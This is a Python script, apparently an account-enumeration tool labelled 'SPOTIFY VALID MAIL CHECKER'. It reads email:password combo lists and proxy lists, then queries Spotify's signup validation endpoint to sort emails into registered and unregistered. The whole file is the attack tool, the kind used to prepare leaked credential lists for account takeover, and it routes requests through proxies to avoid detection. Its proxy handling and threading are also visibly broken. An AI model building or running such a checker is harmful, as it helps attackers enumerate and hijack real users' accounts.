import requests, threading, os
from colorama import Fore

good = 0
bad = 0

choice = input('''
[1] GUI
[2] CLI

[#] Select: ''')
print("\n")

read_email = open("combo.txt", "r")
emails = read_email.readlines()

read_proxy = open("proxy.txt", "r")
proxies = read_proxy.readlines()

for proxy in proxies:
    clean_proxy = proxy.replace("\n", "")

for email in emails:
    clean_email = email.replace("\n", "")
    email_only = clean_email.split(":")[0]
    def checker(): 
        global good, bad
        if choice == "1":
            os.system('cls')
            print(Fore.YELLOW + "                  SPOTIFY VALID MAIL CHECKER")
            print("\n")
            print(f"                {Fore.GREEN}[VALID]          :           {Fore.CYAN}{good}")
            print(f"               {Fore.RED}[INVALId]         :           {Fore.BLUE}{bad}")

            proxies = {
                "http": clean_proxy
            }

            url = f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email_only}"
            response = requests.get(url, proxies=proxies)
            if "That email is already registered to an account." in response.text:
                good += 1
            else:
                bad += 1
        elif choice == "2":
            proxies = {
                "http": clean_proxy
            }

            url = f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email_only}"
            response = requests.get(url, proxies=proxies)
            if "That email is already registered to an account." in response.text:
                print(Fore.GREEN + f"{email_only}")
            else:
                print(Fore.RED + f"{email_only}")
        else:
            print("Wrong Option")

    if __name__ == "__main__":
        response_thread = threading.Thread(target=checker)
        response_thread.start()
        response_thread.join()
print("Finished Checking")
input("")